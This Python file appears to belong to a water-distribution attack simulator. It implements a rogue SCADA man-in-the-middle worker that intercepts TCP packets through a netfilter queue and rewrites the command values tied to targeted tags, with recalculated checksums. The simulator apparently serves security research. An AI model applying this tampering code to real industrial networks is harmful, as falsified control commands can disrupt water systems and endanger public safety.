import argparse
import csv
import os
import sys
from pathlib import Path
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from wacsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
from wacsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload
from wacsim.network_attacks.mitm_netfilter_queue import extract_tag_name

class RogueSCADANetfilterQueue(PacketQueue):
    """
    Rogue SCADA netfilter queue worker. Maps TCP connections to targeted tags
    and modifies the target command values in response packets.
    """
    def __init__(self, intermediate_yaml_path: Path, yaml_index: int, queue_number: int):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)
        self.attacked_tags = self.intermediate_attack['tags']
        self.connection_tags = {}
        
        # Load CSV files if configured
        self.csv_data = {}
        self.csv_index = {}
        for tag in self.attacked_tags:
            for key in ('value', 'offset'):
                val = tag.get(key)
                if isinstance(val, str) and val.endswith('.csv'):
                    try:
                        with open(val, 'r') as f:
                            reader = csv.reader(f)
                            values = [float(row[0]) for row in reader if row and row[0].replace('.', '', 1).replace('-', '', 1).replace('+', '', 1).replace('e', '', 1).replace('E', '', 1).strip()]
                            self.csv_data[(tag['tag'], key)] = values
                            self.csv_index[(tag['tag'], key)] = 0
                            self.logger.debug(f"Loaded {len(values)} entries from {val} for {key} of tag {tag['tag']}")
                    except Exception as e:
                        self.logger.error(f"Failed to load {val} for tag {tag['tag']}: {e}")

    def get_next_csv_value(self, tag_name, key):
        values = self.csv_data.get((tag_name, key))
        if not values:
            return None
        index = self.csv_index[(tag_name, key)]
        value = values[index]
        self.csv_index[(tag_name, key)] = (index + 1) % len(values)
        return value

    def capture(self, packet):
        try:
            p = IP(packet.get_payload())
            if 'TCP' in p and Raw in p:
                payload = p[Raw].load
                tag_name = extract_tag_name(payload)
                
                # Check if it is a request packet to map the TCP connection
                if len(p) > 105 and tag_name:
                    for tag in self.attacked_tags:
                        if tag_name == tag['tag']:
                            client_ip = p[IP].src
                            client_port = p[TCP].sport
                            self.connection_tags[(client_ip, client_port)] = tag
                            self.logger.debug(f"Connection {client_ip}:{client_port} mapped to tag {tag_name}")

                # Modify the matching response packet
                elif len(p) == 102:
                    client_ip = p[IP].dst
                    client_port = p[TCP].dport
                    if (client_ip, client_port) in self.connection_tags:
                        tag_config = self.connection_tags[(client_ip, client_port)]
                        tag_name = tag_config['tag']
                        base_value = translate_payload_to_float(payload)
                        
                        if 'value' in tag_config:
                            val = tag_config['value']
                            if isinstance(val, str) and val.endswith('.csv'):
                                modified_value = self.get_next_csv_value(tag_name, 'value')
                            else:
                                modified_value = val
                        elif 'offset' in tag_config:
                            offset = tag_config['offset']
                            if isinstance(offset, str) and offset.endswith('.csv'):
                                offset = self.get_next_csv_value(tag_name, 'offset')
                            modified_value = base_value + offset
                        else:
                            modified_value = base_value
                        
                        p[Raw].load = translate_float_to_payload(modified_value, payload)
                        # Recalculate checksums
                        del p[IP].chksum
                        del p[TCP].chksum
                        packet.set_payload(bytes(p))
                        self.logger.debug(f"Modified command response for tag '{tag_name}': original={base_value:.4f}, modified={modified_value:.4f}")
                        del self.connection_tags[(client_ip, client_port)]
            packet.accept()
        except Exception as exc:
            self.logger.error(f"Error processing packet: {exc}")
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)

def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start Rogue SCADA NetfilterQueue')
    parser.add_argument(dest="intermediate_yaml",
                        help="Intermediate YAML file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate YAML",
                        type=int, metavar="N")
    parser.add_argument(dest="number", help="Number of the queue configured in IP Tables",
                        type=int, metavar="N")

    args = parser.parse_args()

    attack = RogueSCADANetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number=args.number
    )
    attack.main_loop()
